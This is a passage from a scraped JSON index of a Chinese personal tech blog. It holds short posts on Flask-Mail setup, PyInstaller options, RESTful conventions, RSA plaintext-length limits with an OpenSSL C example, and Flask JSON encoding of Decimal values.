flask配置</h1><ul>\n<li>先贴一个flask-mail的配置项</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>配置项</th>\n<th>默认值</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>MAIL_SERVER</strong></td>\n<td>localhost</td>\n<td>邮箱服务器</td>\n</tr>\n<tr>\n<td><strong>MAIL_PORT</strong></td>\n<td>25</td>\n<td>端口</td>\n</tr>\n<tr>\n<td><strong>MAIL_USE_TLS</strong></td>\n<td>False</td>\n<td>是否使用TLS</td>\n</tr>\n<tr>\n<td><strong>MAIL_USE_SSL</strong></td>\n<td>False</td>\n<td>是否使用SSL</td>\n</tr>\n<tr>\n<td><strong>MAIL_DEBUG</strong></td>\n<td>app.debug</td>\n<td>是否为DEBUG模式，打印调试消息</td>\n</tr>\n<tr>\n<td><strong>MAIL_SUPPRESS_SEND</strong></td>\n<td>app.testing</td>\n<td>设置是否真的发送邮件，True不发送</td>\n</tr>\n<tr>\n<td><strong>MAIL_USERNAME</strong></td>\n<td>None</td>\n<td>用户名，填邮箱</td>\n</tr>\n<tr>\n<td><strong>MAIL_PASSWORD</strong></td>\n<td>None</td>\n<td>密码，填授权码</td>\n</tr>\n<tr>\n<td><strong>MAIL_DEFAULT_SENDER</strong></td>\n<td>None</td>\n<td>默认发送者，填邮箱</td>\n</tr>\n<tr>\n<td><strong>MAIL_MAX_EMAILS</strong></td>\n<td>None</td>\n<td>一次连接中的发送邮件的上限</td>\n</tr>\n<tr>\n<td><strong>MAIL_ASCII_ATTACHMENTS</strong></td>\n<td>False</td>\n<td>如果 MAIL_ASCII_ATTACHMENTS 设置成 True 的话，文件名将会转换成 ASCII 的。一般用于添加附件。</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>安装flask-mail:</li>\n</ul>\n<blockquote>\n<p>pip <strong>install</strong> Flask-Mail</p>\n</blockquote>\n<ul>\n<li>配置config  (这里的配置与书中gmail配置稍有不同)：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.config[<span class=\"string\">'MAIL_SERVER'</span>] = <span class=\"string\">'smtp.qq.com'</span></span><br><span class=\"line\">app.config[<span class=\"string\">'MAIL_PORT'</span>] = <span class=\"number\">465</span></span><br><span class=\"line\">app.config[<span class=\"string\">'MAIL_USE_SSL'</span>] = <span class=\"literal\">True</span></span><br><span class=\"line\">app.config[<span class=\"string\">'MAIL_USERNAME'</span>] = <span class=\"string\">'your_qq@qq.com'</span></span><br><span class=\"line\">app.config[<span class=\"string\">'MAIL_PASSWORD'</span>] = 授权码</span><br><span class=\"line\">app.config[<span class=\"string\">'FLASKY_MAIL_SUBJECT_PREFIX'</span>] = <span class=\"string\">'[Flasky]'</span></span><br><span class=\"line\">app.config[<span class=\"string\">'FLASKY_MAIL_SENDER'</span>] = <span class=\"string\">'your_qq@qq.com'</span></span><br><span class=\"line\">app.config[<span class=\"string\">'FLASKY_ADMIN'</span>] = <span class=\"string\">'your_qq@qq.com'</span></span><br></pre></td></tr></table></figure>\n<p>send_mail  (抄自狗书)：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> threading <span class=\"keyword\">import</span> Thread</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> current_app, render_template</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_mail <span class=\"keyword\">import</span> Message</span><br><span class=\"line\"><span class=\"keyword\">from</span> . <span class=\"keyword\">import</span> mail</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send_async_email</span><span class=\"params\">(app, msg)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> app.app_context():</span><br><span class=\"line\">        mail.send(msg)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send_email</span><span class=\"params\">(to, subject, template, **kwargs)</span>:</span></span><br><span class=\"line\">    app = current_app._get_current_object()</span><br><span class=\"line\">    msg = Message(app.config[<span class=\"string\">'FLASKY_MAIL_SUBJECT_PREFIX'</span>] + <span class=\"string\">' '</span> + subject,</span><br><span class=\"line\">                  sender=app.config[<span class=\"string\">'FLASKY_MAIL_SENDER'</span>], recipients=[to])</span><br><span class=\"line\">    msg.body = render_template(template + <span class=\"string\">'.txt'</span>, **kwargs)</span><br><span class=\"line\">    msg.html = render_template(template + <span class=\"string\">'.html'</span>, **kwargs)</span><br><span class=\"line\">    thr = Thread(target=send_async_email, args=[app, msg])</span><br><span class=\"line\">    thr.start()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> thr</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x03-发送成功\"><a href=\"#0x03-发送成功\" class=\"headerlink\" title=\"0x03 发送成功\"></a>0x03 发送成功</h1><p><img src=\"/images/1561426625808.png\" alt=\"1561426625808\"></p>\n<h1 id=\"0x04-参考链接\"><a href=\"#0x04-参考链接\" class=\"headerlink\" title=\"0x04 参考链接\"></a>0x04 参考链接</h1><p><a href=\"https://dormousehole.readthedocs.io/\" target=\"_blank\" rel=\"noopener\">Flask 文档</a></p>\n<p><a href=\"https://item.jd.com/32399773056.html\" target=\"_blank\" rel=\"noopener\">Flask Web开发：基于Python的Web应用开发实战（第2版）</a></p>\n<p><a href=\"https://pythonhosted.org/Flask-Mail/\" target=\"_blank\" rel=\"noopener\">flask-email手册</a></p>\n<p><a href=\"https://juejin.im/entry/594266e35c497d006bc4ae22\" target=\"_blank\" rel=\"noopener\">使用 Flask-Mail 和 qq 邮箱 SMTP 服务发送邮件</a></p>\n","categories":[],"tags":["backend"]},{"title":"pyinstaller打包python","url":"http://b1ng0.top/2019/06/02/pyinstaller打包python/","content":"<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>迫于某”科研项目”的奇葩要求，需要将python代码打包为exe，网上找了有不少解决方案（py2exe、PyInstaller、cx_Freeze，etc.），这里尝试了下pyinstaller，用着还算顺手。</p>\n<h1 id=\"0x01-安装：\"><a href=\"#0x01-安装：\" class=\"headerlink\" title=\"0x01 安装：\"></a>0x01 安装：</h1><blockquote>\n<p> pip install pyinstaller</p>\n</blockquote>\n<h1 id=\"0x02-打包命令：\"><a href=\"#0x02-打包命令：\" class=\"headerlink\" title=\"0x02 打包命令：\"></a>0x02 打包命令：</h1><blockquote>\n<p>pyinstaller app.py -F -i app.ico -p C:/python/Lib/site-packages</p>\n</blockquote>\n<h1 id=\"0x03-常用参数：\"><a href=\"#0x03-常用参数：\" class=\"headerlink\" title=\"0x03 常用参数：\"></a>0x03 常用参数：</h1><table>\n<thead>\n<tr>\n<th>参数</th>\n<th>用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-F, –onefile</td>\n<td>打包一个单个文件，如果你的代码都写在一个.py文件的话，可以用这个，如果是多个.py文件就别用</td>\n</tr>\n<tr>\n<td>-D, –onedir</td>\n<td>打包多个文件，在dist中生成很多依赖文件，适合以框架形式编写工具代码，我个人比较推荐这样，代码易于维护</td>\n</tr>\n<tr>\n<td>-K, –tk</td>\n<td>在部署时包含 TCL/TK</td>\n</tr>\n<tr>\n<td>-a, –ascii</td>\n<td>不包含编码.在支持Unicode的python版本上默认包含所有的编码.</td>\n</tr>\n<tr>\n<td>-d, –debug</td>\n<td>产生debug版本的可执行文件</td>\n</tr>\n<tr>\n<td>-w,–windowed,–noconsole</td>\n<td>使用Windows子系统执行.当程序启动的时候不会打开命令行(只对Windows有效)</td>\n</tr>\n<tr>\n<td>-c,–nowindowed,–console</td>\n<td>使用控制台子系统执行(默认)(只对Windows有效)</td>\n</tr>\n<tr>\n<td>-s,–strip</td>\n<td>可执行文件和共享库将run through strip.注意Cygwin的strip往往使普通的win32 Dll无法使用.</td>\n</tr>\n<tr>\n<td>-X, –upx</td>\n<td>如果有UPX安装(执行Configure.py时检测),会压缩执行文件(Windows系统中的DLL也会)</td>\n</tr>\n<tr>\n<td>-o DIR, –out=DIR</td>\n<td>指定spec文件的生成目录,如果没有指定,而且当前目录是PyInstaller的根目录,会自动创建一个用于输出(spec和生成的可执行文件)的目录.如果没有指定,而当前目录不是PyInstaller的根目录,则会输出到当前的目录下.</td>\n</tr>\n<tr>\n<td>-p DIR, –path=DIR</td>\n<td>设置导入路径(和使用PYTHONPATH效果相似).可以用路径分割符(Windows使用分号,Linux使用冒号)分割,指定多个目录.也可以使用多个-p参数来设置多个导入路径，让pyinstaller自己去找程序需要的资源.</td>\n</tr>\n<tr>\n<td>–icon=&lt;FILE.ICO&gt;</td>\n<td>将file.ico添加为可执行文件的资源(只对Windows系统有效)，改变程序的图标  pyinstaller -i  ico路径 xxxxx.py</td>\n</tr>\n<tr>\n<td>–icon=&lt;FILE.EXE,N&gt;</td>\n<td>将file.exe的第n个图标添加为可执行文件的资源(只对Windows系统有效)</td>\n</tr>\n<tr>\n<td>-v FILE, –version=FILE</td>\n<td>将verfile作为可执行文件的版本资源(只对Windows系统有效)</td>\n</tr>\n<tr>\n<td>-n NAME, –name=NAME</td>\n<td>可选的项目(产生的spec的)名字.如果省略,第一个脚本的主文件名将作为spec的名字</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"0x04-参考\"><a href=\"#0x04-参考\" class=\"headerlink\" title=\"0x04 参考\"></a>0x04 参考</h1><p><a href=\"https://pyinstaller.readthedocs.io/en/v3.3.1/usage.html\" target=\"_blank\" rel=\"noopener\">https://pyinstaller.readthedocs.io/en/v3.3.1/usage.html</a></p>\n<p><a href=\"https://blog.csdn.net/BearStarX/article/details/81054134\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/BearStarX/article/details/81054134</a></p>\n","categories":[],"tags":["python"]},{"title":"RESTful API","url":"http://b1ng0.top/2019/05/19/RESTful API/","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">【GET】          /users                 # 查询用户信息列表</span><br><span class=\"line\">【GET】          /users/1001            # 查看某个用户信息</span><br><span class=\"line\">【POST】         /users                 # 新建用户信息</span><br><span class=\"line\">【PUT】          /users/1001            # 更新用户信息(全部字段)</span><br><span class=\"line\">【PATCH】        /users/1001            # 更新用户信息(部分字段)</span><br><span class=\"line\">【DELETE】       /users/1001            # 删除用户信息</span><br></pre></td></tr></table></figure>\n<p>在逼乎上看到一个说法：判断一个接口是否RESTful风格只需要看接口中有没有动词，感觉很有道理的样子。。。</p>\n","categories":[],"tags":["backend"]},{"title":"关于公钥与明文长度","url":"http://b1ng0.top/2019/05/13/关于公钥与明文长度/","content":"<p>最近一直在使用密码算法写认证协议相关的东西，发现明文空间过长会导致加解密不成功的情况。</p>\n<p>栗子：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;openssl/rsa.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;openssl/pem.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;openssl/err.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> OPENSSLKEY <span class=\"meta-string\">\"test.key\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> PUBLICKEY <span class=\"meta-string\">\"test_pub.key\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> BUFFSIZE 1024</span></span><br><span class=\"line\"><span class=\"comment\">/*openssl genrsa -out test.key 1024*/</span></span><br><span class=\"line\"><span class=\"comment\">/*openssl rsa -in test.key -pubout -out test_pub.key*/</span></span><br><span class=\"line\"><span class=\"comment\">/*gcc -Wall -O2 -o pk pk.c -lcrypto -lssl*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">my_encrypt</span><span class=\"params\">(<span class=\"keyword\">char</span> *str,<span class=\"keyword\">char</span> *path_key)</span></span>;<span class=\"comment\">//加密</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">my_decrypt</span><span class=\"params\">(<span class=\"keyword\">char</span> *str,<span class=\"keyword\">char</span> *path_key)</span></span>;<span class=\"comment\">//解密</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *source=<span class=\"string\">\"23333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *ptr_en,*ptr_de;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"source is    :%s\\n\"</span>,source);</span><br><span class=\"line\">    ptr_en=my_encrypt(source,PUBLICKEY);</span><br><span class=\"line\">    <span class=\"comment\">//printf(\"after encrypt:%s\\n\",ptr_en);</span></span><br><span class=\"line\">    ptr_de=my_decrypt(ptr_en,OPENSSLKEY);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"after decrypt:%s\\n\"</span>,ptr_de);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(ptr_en!=<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(ptr_en);</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(ptr_de!=<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(ptr_de);</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> *<span class=\"title\">my_encrypt</span><span class=\"params\">(<span class=\"keyword\">char</span> *str,<span class=\"keyword\">char</span> *path_key)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *p_en;</span><br><span class=\"line\">    RSA *p_rsa;</span><br><span class=\"line\">    FILE *file;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> flen,rsa_len;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((file=fopen(path_key,<span class=\"string\">\"r\"</span>))==<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        perror(<span class=\"string\">\"open key file error\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;    </span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    <span class=\"keyword\">if</span>((p_rsa=PEM_read_RSA_PUBKEY(file,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>))==<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        ERR_print_errors_fp(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">    flen=<span class=\"built_in\">strlen</span>(str);</span><br><span class=\"line\">    rsa_len=RSA_size(p_rsa);</span><br><span class=\"line\">    p_en=(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(rsa_len+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(p_en,<span class=\"number\">0</span>,rsa_len+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(RSA_public_encrypt(rsa_len,(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> *)str,(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>*)p_en,p_rsa,RSA_NO_PADDING)&lt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    RSA_free(p_rsa);</span><br><span class=\"line\">    fclose(file);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p_en;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> *<span class=\"title\">my_decrypt</span><span class=\"params\">(<span class=\"keyword\">char</span> *str,<span class=\"keyword\">char</span> *path_key)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *p_de;</span><br><span class=\"line\">    RSA *p_rsa;</span><br><span class=\"line\">    FILE *file;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> rsa_len;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((file=fopen(path_key,<span class=\"string\">\"r\"</span>))==<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        perror(<span class=\"string\">\"open key file error\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((p_rsa=PEM_read_RSAPrivateKey(file,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>))==<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        ERR_print_errors_fp(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    rsa_len=RSA_size(p_rsa);</span><br><span class=\"line\">    p_de=(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(rsa_len+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(p_de,<span class=\"number\">0</span>,rsa_len+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(RSA_private_decrypt(rsa_len,(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> *)str,(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span>*)p_de,p_rsa,RSA_NO_PADDING)&lt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    RSA_free(p_rsa);</span><br><span class=\"line\">    fclose(file);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p_de;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/pk.png\" alt=\"1557752156757\"></p>\n<p>关于密钥与明文长度，从网上查阅的说法如下：</p>\n<blockquote>\n<p>一次能加密的明文长度与密钥长度成正比：</p>\n<p>len_in_byte(raw_data) = len_in_bit(key)/8 -11，如 1024bit 的密钥，一次能加密的内容长度为 1024/8 -11 = 117 byte。</p>\n<p>所以<strong>非对称加密一般都用于加密对称加密算法的密钥，而不是直接加密内容。</strong></p>\n<p>实际上，RSA 算法本身要求加密内容也就是明文长度 m 必须满足 0&lt;m&lt;n，也就是说内容这个大整数不能超过 n，否则就出错。</p>\n<p>那么如果 m=0 是什么结果？</p>\n<p>普遍 RSA 加密器会直接返回全 0 结果，如果 m&gt;n，运算就会出错。</p>\n<p>因此，RSA 实际可加密的明文长度最大也是 1024bits，但问题就来了：</p>\n<p>如果小于这个长度怎么办？</p>\n<p>就需要进行 padding，因为如果没有 padding 用户无法确分解密后内容的真实长度，字符串之类的内容问题还不大，以 0 作为结束符，便于区分。</p>\n<p>但对二进制数据就很难理解，因为不确定后面的 0 是内容还是内容结束符。</p>\n<p>只要用到 padding，那么就会占用实际的明文长度，我们一般使用的 padding 标准有 NoPPadding、OAEPPadding、PKCS1Padding 等。</p>\n<p>其中 PKCS#1 建议的 padding 就占用了 11 个字节，于是才有 117 字节的说法。</p>\n<p>如果大于这个长度怎么办？</p>\n<p>很多算法的 padding 往往是在后边的，但 PKCS 的 padding 则是在前面的，此为有意设计，有意的把第一个字节置 0 以确保 m 的值小于 n。</p>\n<p>这样，128字节（1024bits）- 11 字节正好是117字节，但对于 RSA 加密来讲，padding 也是参与加密的。</p>\n<p>所以，依然按照 <strong>RSA 1024 实际的明文只有 117 字节</strong>。</p>\n<p>关于 PKCS#1 padding 规范可参考：RFC2313 chapter 8.1。</p>\n<p>我们在把明文送给 RSA 加密器前，要确认这个值是不是大于 n，也就是如果接近 n 位长，那么需要先 padding 再分段加密。</p>\n<p>除非我们是“定长定量自己可控可理解”的加密则不需要 padding。</p>\n</blockquote>\n<p>这就不难理解为什么公钥不适合用来做大规模数据传输的加密了，当然如果一定要用公钥来做，也可以通过分段加密或者数字信封的方式解决。</p>\n<p>参考：</p>\n<p><a href=\"https://www.cnblogs.com/jpfss/p/8528406.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/jpfss/p/8528406.html</a></p>\n<p><a href=\"https://www.cnblogs.com/aLittleBitCool/archive/2011/09/22/2185418.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/aLittleBitCool/archive/2011/09/22/2185418.html</a></p>\n","categories":[],"tags":["notes"]},{"title":"flask中的json格式问题","url":"http://b1ng0.top/2019/04/10/flask中的json格式问题/","content":"<p>最近尝试用flask框架写点api, 发现使用json或者jsonify都不能将decimal格式的数据转换为json格式。<br>解决方案：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span>  decimal</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DecimalEncoder</span><span class=\"params\">(json.JSONEncoder)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">　　<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">default</span><span class=\"params\">(self, o)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">　　　　<span class=\"keyword\">if</span> isinstance(o, decimal.Decimal):</span><br><span class=\"line\"></span><br><span class=\"line\">　　　　　　<span class=\"keyword\">return</span> float(o)</span><br><span class=\"line\"></span><br><span class=\"line\">　　　　super(DecimalEncoder, self).default(o)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># and then:</span></span><br><span class=\"line\"></span><br><span class=\"line\">json.dumps(chart_list,..., cls=DecimalEncoder)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JSONEncoder</span><span class=\"params\">(json.JSONEncoder)</span>:</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">default</span><span class=\"params\">(self, o)</span>:</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> isinstance(o,ObjectId):</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">return</span> str(o)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> isinstance(o,Decimal):</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">return</span> str(o)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> json.JSONEncoder.default(self,o)</span><br><span class=\"line\">    </span><br><span class=\"line\">配置到flask应用中</span><br><span class=\"line\"></span><br><span class=\"line\">app.json_encoder = JSONEncoder</span><br></pre></td></tr></table></figure>\n<p>python做web真是麻烦, 还不如用世界上最好的语言curd一把梭(逃。。。<br>参考：<a href=\"https://www.cnblogs.com/libaibuaidufu/p/10152233.html\" target=\"_blank\" rel=\"noopener\">flask json 格式下 decimal 不是正确格式的问题</a></p>\n","categories":[],"tags":["flask"]},{"title":"你尽力了吗？(转载)","url":"http://b1ng0.top/2019/03/28/你尽力了吗？(转载)/","content":"<blockquote>\n<p>出处：<a href=\"http://scz.617.cn:8/body/200004171952.txt\" target=\"_blank\" rel=\"noopener\">http://scz.617.cn:8/body/200004171952.txt</a></p>\n<p>文章来自著名网络安全专家小四scz，大佬00年写的几句话依然让现在的自己感到惭愧万分，遂冒昧的转到这里，与看到的人共勉。</p>\n</blockquote>\n<p>发信人: cloudsky (小四), 信区: Security<br>标 题: 你尽力了吗<br>发信站: 武汉白云黄鹤站 (Mon Apr 17 19:52:54 2000), 